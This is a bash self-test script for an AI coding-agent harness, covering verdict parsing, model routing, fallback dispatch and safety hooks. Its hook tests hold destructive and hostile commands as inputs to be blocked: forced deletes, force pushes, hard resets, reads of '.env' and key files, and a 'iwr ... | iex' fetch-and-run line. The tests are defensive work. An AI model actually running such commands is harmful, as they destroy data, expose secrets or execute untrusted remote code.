#!/usr/bin/env bash
# run-tests.sh — self-tests for the harness's bash logic (mirror of run-tests.ps1).
# Self-contained. jq-dependent tests (the gate, budget) are skipped if jq is absent and run fully in CI.
# Exit 0 = all pass, exit 1 = a failure.
#   Run:  bash harness/tests/run-tests.sh
set -uo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# Engine + hooks are sourced from the PLUGIN PAYLOAD (single source of truth post-E2 flip), not the
# retired in-repo harness/lib + .claude/hooks copies. $HARNESS_ENGINE overrides (e.g. an installed
# plugin's engine/ dir); default is this repo's own plugin/engine. hooks/ is engine's sibling.
REPO_ROOT="$(cd "$HERE/../.." && pwd)"   # harness/tests -> harness -> <repo>
if [ -n "${HARNESS_ENGINE:-}" ] && [ -d "$HARNESS_ENGINE/lib" ]; then ENGINE="$HARNESS_ENGINE"; else ENGINE="$REPO_ROOT/plugin/engine"; fi
LIB="$ENGINE/lib"
HOOKS="$(cd "$ENGINE/.." && pwd)/hooks"
PASS=0; FAIL=0
ok()  { if [ "$1" = "1" ]; then PASS=$((PASS+1)); echo "  ok  $2"; else FAIL=$((FAIL+1)); echo "  FAIL $2"; fi; }

echo "engine hygiene: every engine .sh PARSES (bash -n) — mirror of the PS ParseFile check"
# Regression (2026-07-15): the PS twin (loop.ps1) shipped a here-string parse error invisible to the
# suite because it sources lib/*.sh + runs functions but never PARSES the top-level entry scripts. bash -n
# checks syntax without executing, so a broken loop/fleet/migrate/wrapper script fails the gate here too.
while IFS= read -r es; do
  if bash -n "$es" 2>/dev/null; then p=1; else p=0; fi
  ok "$p" "parses: ${es#"$ENGINE"/}"
done < <(find "$ENGINE" -type f -name '*.sh' | sort)

echo "plan counter: grep -c emits a single clean count (the bug fix)"
tmp="$(mktemp)"
printf '%s\n' '- [ ] one' '- [x] done' '<!-- - [ ] commented -->' '- [ ] two' > "$tmp"
n="$(grep -cE '^[[:space:]]*[-*][[:space:]]+\[ \]' "$tmp" || true)"; n="${n:-0}"
ok "$([ "$n" = "2" ] && echo 1 || echo 0)" "counts 2 open items, single line (got '$n')"
: > "$tmp"   # empty plan
e="$(grep -cE '^[[:space:]]*[-*][[:space:]]+\[ \]' "$tmp" || true)"; e="${e:-0}"
ok "$([ "$e" = "0" ] && echo 1 || echo 0)" "empty plan => 0 (no double line) (got '$e')"
rm -f "$tmp"

echo "review verdict: fail-closed last-VERDICT-line parsing"
# shellcheck source=../lib/gate.sh
source "$LIB/gate.sh"   # review_verdict needs no jq; the gate tests below re-source with jq present
v="$(printf 'findings...\nVERDICT: SHIP\n' | review_verdict)"
ok "$([ "$v" = "SHIP" ] && echo 1 || echo 0)" "SHIP on a clean final verdict (got '$v')"
v="$(printf 'I cannot give VERDICT: SHIP.\nVERDICT: REJECT\n' | review_verdict)"
ok "$([ "$v" = "REJECT" ] && echo 1 || echo 0)" "REJECT wins as the last VERDICT line (got '$v')"
v="$(printf 'maybe VERDICT: SHIP later, still checking\n' | review_verdict)"
ok "$([ "$v" = "NONE" ] && echo 1 || echo 0)" "mid-sentence SHIP is not a verdict (got '$v')"
v="$(printf '' | review_verdict)"
ok "$([ "$v" = "NONE" ] && echo 1 || echo 0)" "empty output fails closed (got '$v')"

echo "evaluator verdict: fail-closed parse + sub-threshold N/10 override (evaluator_verdict)"
v="$(printf '1. Correctness 8/10\nVERDICT: PASS\n' | evaluator_verdict 7)"
ok "$([ "$v" = "PASS" ] && echo 1 || echo 0)" "PASS when verdict PASS and all scores >= threshold (got '$v')"
v="$(printf '3. Robustness 5/10\nVERDICT: PASS\n' | evaluator_verdict 7)"
ok "$([ "$v" = "FAIL" ] && echo 1 || echo 0)" "sub-threshold score overrides a PASS summary => FAIL (got '$v')"
v="$(printf '1. Correctness 9/10\nVERDICT: FAIL\n' | evaluator_verdict 7)"
ok "$([ "$v" = "FAIL" ] && echo 1 || echo 0)" "explicit VERDICT: FAIL => FAIL (got '$v')"
v="$(printf '1. Correctness 8/10 looks good\n' | evaluator_verdict 7)"
ok "$([ "$v" = "NONE" ] && echo 1 || echo 0)" "no VERDICT line => NONE (got '$v')"
v="$(printf '' | evaluator_verdict 7)"
ok "$([ "$v" = "NONE" ] && echo 1 || echo 0)" "empty text => NONE (got '$v')"
v="$(printf 'I might say VERDICT: PASS later\n' | evaluator_verdict 7)"
ok "$([ "$v" = "NONE" ] && echo 1 || echo 0)" "mid-sentence VERDICT: PASS is not a verdict => NONE (got '$v')"
v="$(printf '1. Correctness 7/10\nVERDICT: PASS\n' | evaluator_verdict 7)"
ok "$([ "$v" = "PASS" ] && echo 1 || echo 0)" "score AT threshold (7/10, strict <) not below => PASS (got '$v')"

echo "codex reviewer: availability probe drives the claude fallback"
# shellcheck source=../lib/invoke-codex.sh
source "$LIB/invoke-codex.sh"   # codex_available needs no jq and no codex install
if r="$(codex_available chatgpt no-such-codex-xyz)"; then av=0; else av=1; fi
ok "$([ "$av" = "1" ] && printf '%s' "$r" | grep -q 'not found' && echo 1 || echo 0)" "missing binary => unavailable with reason (got '$r')"
if r="$( (unset CODEX_API_KEY; codex_available api-key ls) )"; then av=0; else av=1; fi   # binary present; api-key mode probes only the env var
ok "$([ "$av" = "1" ] && printf '%s' "$r" | grep -q 'CODEX_API_KEY' && echo 1 || echo 0)" "api-key mode without CODEX_API_KEY => unavailable (got '$r')"
if r="$(CODEX_API_KEY=test-key codex_available api-key ls)"; then av=0; else av=1; fi
ok "$([ "$av" = "0" ] && echo 1 || echo 0)" "api-key mode with CODEX_API_KEY => available"

echo "codex arg-assembly: mode selects the sandbox flag"
ro="$(codex_args read-only /repo /tmp/m gpt-x high)"
ww="$(codex_args workspace-write /repo /tmp/m)"
ok "$(printf '%s' "$ro" | grep -q -- '--sandbox' && printf '%s' "$ro" | grep -qx 'read-only' && echo 1 || echo 0)" "read-only mode => sandbox read-only"
ok "$(printf '%s' "$ww" | grep -qx 'workspace-write' && echo 1 || echo 0)" "workspace-write mode => sandbox workspace-write"
ok "$(printf '%s' "$ro" | grep -qx 'never' && echo 1 || echo 0)" "keeps --ask-for-approval never"
ok "$(printf '%s' "$ro" | grep -qx -- '-m' && printf '%s' "$ro" | grep -qx 'gpt-x' && echo 1 || echo 0)" "model passed as -m"
ok "$(printf '%s' "$ww" | grep -qx -- '-m' && echo 0 || echo 1)" "no model => no -m flag"

echo "usage-limit predicate: vendor-neutral markers"
usage_limit_error 'monthly usage limit reached'   && ok 1 "detects usage limit"      || ok 0 "detects usage limit"
usage_limit_error 'rate limit exceeded'           && ok 1 "detects rate limit"       || ok 0 "detects rate limit"
usage_limit_error 'QUOTA exhausted'               && ok 1 "detects quota (any case)" || ok 0 "detects quota"
usage_limit_error 'model is overloaded'           && ok 1 "detects overloaded"       || ok 0 "detects overloaded"
usage_limit_error 'server returned HTTP 429'      && ok 1 "detects HTTP 429"         || ok 0 "detects HTTP 429"
usage_limit_error 'review complete VERDICT: SHIP' && ok 0 "clean output => false"    || ok 1 "clean output => false"
usage_limit_error 'processed 429 files'           && ok 0 "stray 429 => false"       || ok 1 "stray 429 => false"
usage_limit_error ''                              && ok 0 "empty => false"           || ok 1 "empty => false"

echo "sandbox predicate: HARNESS_SANDBOX contract + auto-detect (is_sandboxed, gate.sh)"
# Each case runs in a SUBSHELL so the env var never leaks into the next case or the rest of the suite.
( export HARNESS_SANDBOX=1;     is_sandboxed ) && ok 1 "HARNESS_SANDBOX=1 => sandboxed"        || ok 0 "HARNESS_SANDBOX=1 => sandboxed"
( export HARNESS_SANDBOX=true;  is_sandboxed ) && ok 1 "HARNESS_SANDBOX=true => sandboxed"     || ok 0 "HARNESS_SANDBOX=true => sandboxed"
( export HARNESS_SANDBOX=yes;   is_sandboxed ) && ok 1 "HARNESS_SANDBOX=yes => sandboxed"      || ok 0 "HARNESS_SANDBOX=yes => sandboxed"
( export HARNESS_SANDBOX=YES;   is_sandboxed ) && ok 1 "HARNESS_SANDBOX=YES => sandboxed (case-insensitive)" || ok 0 "HARNESS_SANDBOX=YES => sandboxed (case-insensitive)"
( export HARNESS_SANDBOX=0;     is_sandboxed ) && ok 0 "HARNESS_SANDBOX=0 => NOT sandboxed"    || ok 1 "HARNESS_SANDBOX=0 => NOT sandboxed"
( export HARNESS_SANDBOX=false; is_sandboxed ) && ok 0 "HARNESS_SANDBOX=false => NOT sandboxed" || ok 1 "HARNESS_SANDBOX=false => NOT sandboxed"
# Explicit falsy OVERRIDES any auto-detected marker: fake a docker-like cgroup env and assert 0 still wins.
( export HARNESS_SANDBOX=0 CODESPACES=true REMOTE_CONTAINERS=1; is_sandboxed ) && ok 0 "explicit 0 beats markers" || ok 1 "explicit 0 beats markers"
# Unset explicit signal + scrub env markers. The RESULT depends on the host: on a bare host => NOT
# sandboxed; INSIDE a container (this task's own sandbox profile!) the filesystem markers (/.dockerenv,
# cgroup) remain and CANNOT be unset, so the correct answer there is sandboxed. Branch on host bareness so
# the suite passes both on a normal host AND inside the devcontainer/CI-container it ships.
if [ ! -f /.dockerenv ] && [ ! -f /run/.containerenv ] \
   && ! { [ -f /proc/1/cgroup ] && grep -qE 'docker|containerd|lxc|kubepods' /proc/1/cgroup 2>/dev/null; }; then
  ( unset HARNESS_SANDBOX CODESPACES REMOTE_CONTAINERS DEVCONTAINER container; is_sandboxed ) && ok 0 "unset + no markers (bare host) => NOT sandboxed" || ok 1 "unset + no markers (bare host) => NOT sandboxed"
else
  ( unset HARNESS_SANDBOX CODESPACES REMOTE_CONTAINERS DEVCONTAINER container; is_sandboxed ) && ok 1 "unset env markers but host is a container => sandboxed (fs marker)" || ok 0 "unset env markers but host is a container => sandboxed (fs marker)"
fi
# Marker env vars are PRESENCE markers (any set => sandboxed), NOT truthy: CODESPACES=false is still present,
# and `container` holds a runtime NAME. Scrub the other markers so each case isolates the one under test.
( unset HARNESS_SANDBOX REMOTE_CONTAINERS DEVCONTAINER container; export CODESPACES=false; is_sandboxed ) && ok 1 "CODESPACES=false (present, not truthy) => sandboxed" || ok 0 "CODESPACES=false (present, not truthy) => sandboxed"
( unset HARNESS_SANDBOX CODESPACES REMOTE_CONTAINERS DEVCONTAINER; export container=lxc; is_sandboxed ) && ok 1 "container=lxc (name value, present) => sandboxed" || ok 0 "container=lxc (name value, present) => sandboxed"

echo "block-destructive hook: blocks dangerous, allows safe"
hookrc() {  # $1 = command (no quotes/backslashes in our test inputs) ; echoes hook exit code
  printf '{"tool_name":"Bash","tool_input":{"command":"%s"}}' "$1" \
    | bash "$HOOKS/block-destructive.sh" >/dev/null 2>&1; echo $?
}
rmfr='rm -fr build'; pushf='git push -f origin main'; finddel='find . -delete'
resetx='git reset --hard abc1234'; grepsec='grep x .env'; rmpost='rm build_dir -rf'
lease='git push --force-with-lease origin main'
ok "$([ "$(hookrc "$rmfr")"   = "2" ] && echo 1 || echo 0)" "blocks rm -fr (flag order)"
ok "$([ "$(hookrc "$rmpost")" = "2" ] && echo 1 || echo 0)" "blocks rm <dir> -rf (flags after operand)"
ok "$([ "$(hookrc "$pushf")"  = "2" ] && echo 1 || echo 0)" "blocks git push -f (short flag)"
ok "$([ "$(hookrc "$finddel")" = "2" ] && echo 1 || echo 0)" "blocks find -delete"
ok "$([ "$(hookrc "$resetx")" = "2" ] && echo 1 || echo 0)" "blocks git reset --hard <sha>"
ok "$([ "$(hookrc "$grepsec")" = "2" ] && echo 1 || echo 0)" "blocks secret read via grep"
ok "$([ "$(hookrc 'git status')"      = "0" ] && echo 1 || echo 0)" "allows git status"
ok "$([ "$(hookrc 'npm test')"        = "0" ] && echo 1 || echo 0)" "allows npm test"
ok "$([ "$(hookrc 'git push origin feature')" = "0" ] && echo 1 || echo 0)" "allows normal git push"
ok "$([ "$(hookrc "$lease")" = "0" ] && echo 1 || echo 0)" "ALLOWS git push --force-with-lease (recommended)"

echo "block-destructive: work-discard + remote-pipe coverage, false-positive exemptions"
ok "$([ "$(hookrc 'git checkout .')" = "2" ] && echo 1 || echo 0)" "blocks git checkout . (bare dot)"
ok "$([ "$(hookrc 'git restore .')"  = "2" ] && echo 1 || echo 0)" "blocks git restore ."
ok "$([ "$(hookrc 'git clean --force')" = "2" ] && echo 1 || echo 0)" "blocks git clean --force (long form)"
ok "$([ "$(hookrc 'iwr https://x.example/i.ps1 | iex')" = "2" ] && echo 1 || echo 0)" "blocks iwr | iex"
ok "$([ "$(hookrc 'git checkout feature-branch')" = "0" ] && echo 1 || echo 0)" "allows git checkout feature-branch"
ok "$([ "$(hookrc 'cat .env.example')" = "0" ] && echo 1 || echo 0)" "allows cat .env.example (template)"
ok "$([ "$(hookrc 'cat src/api.key.ts')" = "0" ] && echo 1 || echo 0)" "allows src/api.key.ts (source, not a key file)"
ok "$([ "$(hookrc 'cat server.key')" = "2" ] && echo 1 || echo 0)" "blocks reading server.key"
# quoted flags + commit-message scrub need raw payloads with embedded escaped quotes, which only
# decode correctly through jq — skip in degraded (jq-less) mode like the other jq-dependent tests.
if command -v jq >/dev/null 2>&1; then
  payload_rmq='{"tool_name":"Bash","tool_input":{"command":"rm \"-rf\" build"}}'
  rc="$(printf '%s' "$payload_rmq" | bash "$HOOKS/block-destructive.sh" >/dev/null 2>&1; echo $?)"
  ok "$([ "$rc" = "2" ] && echo 1 || echo 0)" "blocks rm with quoted flags (got '$rc')"
  payload_msg='{"tool_name":"Bash","tool_input":{"command":"git commit -m \"docs: mention drop table users in migration notes\""}}'
  rc="$(printf '%s' "$payload_msg" | bash "$HOOKS/block-destructive.sh" >/dev/null 2>&1; echo $?)"
  ok "$([ "$rc" = "0" ] && echo 1 || echo 0)" "allows commit msg mentioning drop table (got '$rc')"
else
  echo "  (skipping quoted-payload tests — jq not installed)"
fi

echo "block-destructive: spec-lock blocks shell writes to specs/ only when locked"
hookrc_locked() {  # $1 = command ; $2 = HARNESS_LOCK_SPECS value
  printf '{"tool_name":"Bash","tool_input":{"command":"%s"}}' "$1" \
    | HARNESS_LOCK_SPECS="$2" bash "$HOOKS/block-destructive.sh" >/dev/null 2>&1; echo $?
}
specwrite='echo hacked > specs/000-overview.md'
ok "$([ "$(hookrc_locked "$specwrite" '1')" = "2" ] && echo 1 || echo 0)" "blocks shell write to specs/ when locked"
ok "$([ "$(hookrc_locked "$specwrite" '')"  = "0" ] && echo 1 || echo 0)" "allows shell write to specs/ when unlocked"
# WRITES must be blocked even without a space after the redirect; READS must stay allowed (the loop
# has to read specs), so sed -n and cp-out-of-specs pass while cp-into-specs and touch are blocked.
ok "$([ "$(hookrc_locked 'echo hacked >specs/000-overview.md' '1')" = "2" ] && echo 1 || echo 0)" "blocks >specs/ redirect without a space when locked"
ok "$([ "$(hookrc_locked 'touch specs/new-spec.md' '1')" = "2" ] && echo 1 || echo 0)" "blocks touch specs/ when locked"
ok "$([ "$(hookrc_locked 'sed -n 1,40p specs/000-overview.md' '1')" = "0" ] && echo 1 || echo 0)" "ALLOWS sed -n ranged READ of specs/ when locked"
ok "$([ "$(hookrc_locked 'cp specs/000-overview.md /tmp/spec-copy.md' '1')" = "0" ] && echo 1 || echo 0)" "ALLOWS cp specs/ -> elsewhere (read) when locked"
ok "$([ "$(hookrc_locked 'cp /tmp/spec-copy.md specs/000-overview.md' '1')" = "2" ] && echo 1 || echo 0)" "blocks cp -> specs/ (write) when locked"

echo "protect-specs hook: locks specs/ only when HARNESS_LOCK_SPECS is set"
specrc() {  # $1 = file_path ; $2 = HARNESS_LOCK_SPECS value ("" = unset) ; echoes hook exit code
  printf '{"tool_name":"Write","tool_input":{"file_path":"%s"}}' "$1" \
    | HARNESS_LOCK_SPECS="$2" bash "$HOOKS/protect-specs.sh" >/dev/null 2>&1; echo $?
}
if command -v jq >/dev/null 2>&1; then
  ok "$([ "$(specrc 'specs/000-overview.md' '1')" = "2" ] && echo 1 || echo 0)" "blocks specs/ write when locked"
  ok "$([ "$(specrc 'src/app.ts' '1')"            = "0" ] && echo 1 || echo 0)" "allows non-spec write when locked"
  ok "$([ "$(specrc 'specs/000-overview.md' '')"  = "0" ] && echo 1 || echo 0)" "allows specs/ write when unlocked"
  specrc_nb() {  # $1 = notebook_path ; $2 = HARNESS_LOCK_SPECS value
    printf '{"tool_name":"NotebookEdit","tool_input":{"notebook_path":"%s"}}' "$1" \
      | HARNESS_LOCK_SPECS="$2" bash "$HOOKS/protect-specs.sh" >/dev/null 2>&1; echo $?
  }
  ok "$([ "$(specrc_nb 'specs/nb.ipynb' '1')" = "2" ] && echo 1 || echo 0)" "blocks specs/*.ipynb via notebook_path when locked"
else
  echo "  (skipping protect-specs tests — jq not installed)"
fi

if command -v jq >/dev/null 2>&1; then
  echo "gate (jq present): multi-component pass + failure attribution"
  SCRIPT_DIR="$(cd "$HERE/.." && pwd)"; REPO_ROOT="$SCRIPT_DIR/.."
  # shellcheck source=../lib/gate.sh
  source "$LIB/gate.sh"; source "$LIB/budget.sh"
  passcfg="$(mktemp)"; cat > "$passcfg" <<'JSON'
{ "components":[ {"name":"frontend","path":".","gate":{"format":"true","test":"true"}},
                 {"name":"backend","path":".","gate":{"format":"true","test":"true"}} ],
  "gate":{"e2e":"true"} }
JSON
  if run_gate "$passcfg"; then ok 1 "multi-component all-green passes"; else ok 0 "multi-component all-green passes"; fi
  failcfg="$(mktemp)"; cat > "$failcfg" <<'JSON'
{ "components":[ {"name":"frontend","path":".","gate":{"format":"true"}},
                 {"name":"backend","path":".","gate":{"format":"true","lint":"false"}} ],
  "gate":{} }
JSON
  if run_gate "$failcfg"; then ok 0 "failure attributed to backend:lint"; else ok "$([ "$GATE_FAILED_STEP" = "backend:lint" ] && echo 1 || echo 0)" "failure attributed to backend:lint (got '$GATE_FAILED_STEP')"; fi
  # A configured component whose dir is missing must FAIL the gate, not be skipped into a fail-open green.
  misscfg="$(mktemp)"; cat > "$misscfg" <<'JSON'
{ "components":[ {"name":"ghost","path":"no-such-dir-xyz","gate":{"format":"true"}} ], "gate":{} }
JSON
  if run_gate "$misscfg"; then ok 0 "missing component dir fails the gate (fail-closed)"; else ok "$([ "$GATE_FAILED_STEP" = "ghost:path-missing" ] && echo 1 || echo 0)" "missing component dir fails the gate (got '$GATE_FAILED_STEP')"; fi
  rm -f "$misscfg"
  # A step that writes to stderr but exits 0 must still pass (mirrors the EAP=Stop regression on the PS side).
  stderrcfg="$(mktemp)"; cat > "$stderrcfg" <<'JSON'
{ "components":[ {"name":"root","path":".","gate":{"format":"echo oops 1>&2","test":"true"}} ], "gate":{} }
JSON
  if run_gate "$stderrcfg"; then ok 1 "stderr-on-exit-0 gate passes"; else ok 0 "stderr-on-exit-0 gate passes (got '$GATE_FAILED_STEP')"; fi
  echo "fleet: ownership overlap + batch selection (file-partitioned parallelism)"
  # shellcheck source=../lib/fleet.sh
  source "$LIB/fleet.sh"
  ok "$(fleet_overlap 'src/api/' 'src/api' && echo 1 || echo 0)" "same dir overlaps"
  ok "$(fleet_overlap 'src/api/routes.ts' 'src/api/' && echo 1 || echo 0)" "nested path overlaps"
  ok "$(fleet_overlap 'src/api/**' 'src/api/routes.ts' && echo 1 || echo 0)" "glob suffix normalized"
  ok "$(fleet_overlap 'SRC\API\' 'src/api/x.ts' && echo 1 || echo 0)" "case/slash-insensitive parity"
  ok "$(fleet_overlap 'src/api/' 'src/web/' && echo 0 || echo 1)" "disjoint dirs do not overlap"
  ok "$(fleet_overlap '' 'src/web/' && echo 1 || echo 0)" "empty entry overlaps everything (fail-closed)"
  fleetm="$(mktemp)"; cat > "$fleetm" <<'JSON'
{ "tasks": [
  { "id": "T1", "status": "todo",    "files": ["src/api/"] },
  { "id": "T2", "status": "todo",    "files": ["src/api/handlers/"] },
  { "id": "T3", "status": "planned", "files": ["src/web/"] },
  { "id": "T4", "status": "done",    "files": ["docs/"] },
  { "id": "T5", "status": "todo",    "files": [] },
  { "id": "T6", "status": "todo",    "files": ["tools/"] }
] }
JSON
  sel="$(fleet_select_tasks "$fleetm" 3 | paste -sd, -)"
  ok "$([ "$sel" = "T1,T3,T6" ] && echo 1 || echo 0)" "selects T1,T3,T6 (skips overlap/status/unowned) (got '$sel')"
  sel="$(fleet_select_tasks "$fleetm" 2 | paste -sd, -)"
  ok "$([ "$sel" = "T1,T3" ] && echo 1 || echo 0)" "maxWorkers caps the batch (got '$sel')"
  rm -f "$fleetm"

  echo "model routing: phase_model (config.models -> --model; empty = inherit)"
  mcfg="$(mktemp)"; printf '%s' '{ "models": { "implement": "opus", "reviewFallback": "fable", "plan": null } }' > "$mcfg"
  m="$(phase_model "$mcfg" implement)"
  ok "$([ "$m" = "opus" ] && echo 1 || echo 0)" "resolves implement model (got '$m')"
  m="$(phase_model "$mcfg" reviewFallback)"
  ok "$([ "$m" = "fable" ] && echo 1 || echo 0)" "resolves reviewFallback model (got '$m')"
  m="$(phase_model "$mcfg" explore)"
  ok "$([ -z "$m" ] && echo 1 || echo 0)" "missing phase key => inherit (got '$m')"
  m="$(phase_model "$mcfg" plan)"
  ok "$([ -z "$m" ] && echo 1 || echo 0)" "explicit null => inherit (got '$m')"
  nocfg="$(mktemp)"; printf '%s' '{ "autonomy": {} }' > "$nocfg"   # pruned-config tolerance
  m="$(phase_model "$nocfg" implement)"
  ok "$([ -z "$m" ] && echo 1 || echo 0)" "no models block => inherit (got '$m')"
  rm -f "$mcfg" "$nocfg"

  echo "model routing: nested {model,fallback} shape + phase_fallback"
  # The migrated config uses per-phase {model, fallback}; phase_model stays PRIMARY-returning for existing
  # loop/fleet callers, phase_fallback is the new accessor, and both remain tolerant of the legacy flat form.
  ncfg="$(mktemp)"; printf '%s' '{ "models": {
    "implement": { "model": "opus",  "fallback": "codex" },
    "review":    { "model": "codex", "fallback": "fable" },
    "docs":      { "model": "haiku", "fallback": null } } }' > "$ncfg"
  m="$(phase_model "$ncfg" implement)";      ok "$([ "$m" = "opus" ]  && echo 1 || echo 0)" "nested primary => model (got '$m')"
  m="$(phase_model "$ncfg" review)";         ok "$([ "$m" = "codex" ] && echo 1 || echo 0)" "nested review primary => codex (got '$m')"
  m="$(phase_fallback "$ncfg" implement)";   ok "$([ "$m" = "codex" ] && echo 1 || echo 0)" "nested fallback => fallback model (got '$m')"
  m="$(phase_model "$ncfg" reviewFallback)"; ok "$([ "$m" = "fable" ] && echo 1 || echo 0)" "reviewFallback pseudo-phase => review.fallback (got '$m')"
  m="$(phase_fallback "$ncfg" docs)";        ok "$([ -z "$m" ] && echo 1 || echo 0)" "nested null fallback => inherit (got '$m')"
  m="$(phase_model "$ncfg" plan)";           ok "$([ -z "$m" ] && echo 1 || echo 0)" "nested absent phase => inherit (model) (got '$m')"
  m="$(phase_fallback "$ncfg" plan)";        ok "$([ -z "$m" ] && echo 1 || echo 0)" "nested absent phase => inherit (fallback) (got '$m')"
  # legacy flat shape stays valid: primary still resolves; review fallback still comes from top-level reviewFallback.
  frcfg="$(mktemp)"; printf '%s' '{ "models": { "implement": "opus", "review": "codex", "reviewFallback": "fable" } }' > "$frcfg"
  m="$(phase_model "$frcfg" implement)";     ok "$([ "$m" = "opus" ]  && echo 1 || echo 0)" "flat-legacy primary still resolves (got '$m')"
  m="$(phase_model "$frcfg" reviewFallback)";ok "$([ "$m" = "fable" ] && echo 1 || echo 0)" "flat-legacy reviewFallback (top-level) (got '$m')"
  m="$(phase_fallback "$frcfg" review)";     ok "$([ "$m" = "fable" ] && echo 1 || echo 0)" "flat review fallback => top-level reviewFallback (got '$m')"
  m="$(phase_fallback "$frcfg" implement)";  ok "$([ -z "$m" ] && echo 1 || echo 0)" "flat non-review phase has no fallback (got '$m')"
  rm -f "$ncfg" "$frcfg"

  echo "model routing S1b: phase_fallback review symmetric with reviewFallback pseudo-phase"
  # Mixed config: nested review with a NULL fallback + a legacy top-level reviewFallback. Both accessors
  # must agree ("fable"); before S1b, phase_fallback returned "" while phase_model returned "fable".
  mixcfg="$(mktemp)"; printf '%s' '{ "models": { "review": { "model": "codex", "fallback": null }, "reviewFallback": "fable" } }' > "$mixcfg"
  a="$(phase_fallback "$mixcfg" review)"; b="$(phase_model "$mixcfg" reviewFallback)"
  ok "$([ "$a" = "fable" ] && echo 1 || echo 0)" "mixed review.fallback=null falls to legacy (got '$a')"
  ok "$([ "$a" = "$b" ] && echo 1 || echo 0)" "mixed: fallback accessor == reviewFallback pseudo (a='$a' b='$b')"
  nrcfg="$(mktemp)"; printf '%s' '{ "models": { "review": { "model": "codex", "fallback": "sonnet" } } }' > "$nrcfg"
  a="$(phase_fallback "$nrcfg" review)"; b="$(phase_model "$nrcfg" reviewFallback)"
  ok "$([ "$a" = "sonnet" ] && echo 1 || echo 0)" "nested review.fallback=sonnet => fallback accessor (got '$a')"
  ok "$([ "$b" = "sonnet" ] && echo 1 || echo 0)" "nested review.fallback=sonnet => reviewFallback pseudo (got '$b')"
  abcfg="$(mktemp)"; printf '%s' '{ "models": { "reviewFallback": "fable" } }' > "$abcfg"
  a="$(phase_fallback "$abcfg" review)"; ok "$([ "$a" = "fable" ] && echo 1 || echo 0)" "absent review + legacy => fallback accessor (got '$a')"
  # A plain nested NON-review phase with a null fallback still returns "" (unchanged).
  ncfg2="$(mktemp)"; printf '%s' '{ "models": { "docs": { "model": "haiku", "fallback": null } } }' > "$ncfg2"
  a="$(phase_fallback "$ncfg2" docs)"; ok "$([ -z "$a" ] && echo 1 || echo 0)" "non-review nested null fallback still => '' (got '$a')"
  rm -f "$mixcfg" "$nrcfg" "$abcfg" "$ncfg2"

  echo "dispatch: invoke_phase fallback trigger (stub claude; deterministic, no real model/codex)"
  # shellcheck source=../lib/dispatch.sh
  source "$LIB/dispatch.sh"
  # A stub "claude" branches on its --model arg to force usage/generic/clean outcomes and logs each model
  # it is invoked with, so we can prove the fallback did/did NOT fire. Lives outside any repo (no git).
  dstub="$(mktemp)"; dlog="$(mktemp)"; dmlog="$(mktemp)"
  cat > "$dstub" <<'STUB'
#!/usr/bin/env bash
cat >/dev/null   # drain the piped prompt
model=""
while [ $# -gt 0 ]; do case "$1" in --model) model="$2"; shift 2;; *) shift;; esac; done
[ -n "${STUB_MODEL_LOG:-}" ] && printf '%s\n' "$model" >> "$STUB_MODEL_LOG"
case "$model" in
  *usage*)      echo 'Error: monthly usage limit reached'; exit 1;;
  *generic*)    echo 'build failed: TypeError in module';  exit 1;;
  *overloadok*) echo 'build complete; note: server was overloaded earlier'; exit 0;;
  *)            echo 'clean ok output'; exit 0;;
esac
STUB
  chmod +x "$dstub"
  dout="$(mktemp)"
  # run_phase must be called DIRECTLY (not in $(...)) so invoke_phase's INVOKE_PHASE_* globals propagate;
  # stdout is redirected to a file (a redirect spawns no subshell). Sets $rc to the phase return.
  run_phase() {  # $1 primary  $2 fallback  $3 codex_cmd(optional)
    : > "$dmlog"
    if STUB_MODEL_LOG="$dmlog" invoke_phase read-only 'do the task' "$(dirname "$dstub")" "$dlog" \
        "$1" "$2" "" 20 chatgpt "" "" 900 "$dstub" "${3:-no-such-codex-xyz}" > "$dout"; then rc=0; else rc=$?; fi
  }
  # 1. Primary success, no fallback.
  run_phase primary-ok ''
  ok "$([ "$rc" = "0" ] && [ "$INVOKE_PHASE_PATH" = "claude" ] && [ "$INVOKE_PHASE_USED_FALLBACK" = "0" ] && [ -z "$INVOKE_PHASE_REASON" ] && echo 1 || echo 0)" "1 primary success => ok, path=claude, no fallback"
  # 2. Usage-limit on primary => advance; fallback (clean) succeeds.
  run_phase m-usage m-ok2
  ok "$([ "$rc" = "0" ] && [ "$INVOKE_PHASE_USED_FALLBACK" = "1" ] && [ "$INVOKE_PHASE_PATH" = "claude" ] && echo 1 || echo 0)" "2 usage-limit => fallback fires, ok, usedFallback=1"
  # 3. Codex primary UNAVAILABLE (stub codex missing) => claude fallback.
  run_phase codex m-ok
  ok "$([ "$rc" = "0" ] && [ "$INVOKE_PHASE_USED_FALLBACK" = "1" ] && [ "$INVOKE_PHASE_PATH" = "claude" ] && echo 1 || echo 0)" "3 codex unavailable => claude fallback, ok, path=claude"
  # 4. Generic (non-usage) failure must NOT advance to the fallback.
  run_phase m-generic m-fallback-marker
  ok "$([ "$rc" != "0" ] && [ "$INVOKE_PHASE_REASON" = "invoke-failed" ] && [ "$INVOKE_PHASE_USED_FALLBACK" = "0" ] && echo 1 || echo 0)" "4 generic failure => not-ok, invoke-failed, no fallback"
  ok "$(grep -q 'm-fallback-marker' "$dmlog" && echo 0 || echo 1)" "4 fallback stub was NEVER invoked (marker absent)"
  # 5. Exhaustion: primary + fallback both usage-limited.
  run_phase m-usage m-usage2
  ok "$([ "$rc" != "0" ] && [ "$INVOKE_PHASE_REASON" = "exhausted" ] && [ -z "$INVOKE_PHASE_PATH" ] && [ "$INVOKE_PHASE_USED_FALLBACK" = "1" ] && echo 1 || echo 0)" "5 both usage-limited => not-ok, exhausted, path empty"
  # 6. Ratchet guard: a SUCCESS whose text mentions 'overloaded' is NEVER re-examined for usage markers.
  run_phase m-overloadok m-ok
  ok "$([ "$rc" = "0" ] && [ "$INVOKE_PHASE_PATH" = "claude" ] && [ "$INVOKE_PHASE_USED_FALLBACK" = "0" ] && echo 1 || echo 0)" "6 success w/ 'overloaded' text => ok, no fallback (ratchet)"
  ok "$(grep -qx 'm-ok' "$dmlog" && echo 0 || echo 1)" "6 fallback NOT consulted on the success"
  rm -f "$dstub" "$dlog" "$dmlog" "$dout"
  reset_budget; ok "$([ "$(_budget_spent)" = "0" ] && echo 1 || echo 0)" "budget resets to 0"
  if budget_exceeded 0; then ok 0 "tokenBudget 0 = no cap (parity with budget.ps1)"; else ok 1 "tokenBudget 0 = no cap (parity with budget.ps1)"; fi
  # budget parser takes the MAX of each token field, not the sum (modelUsage repeats counts).
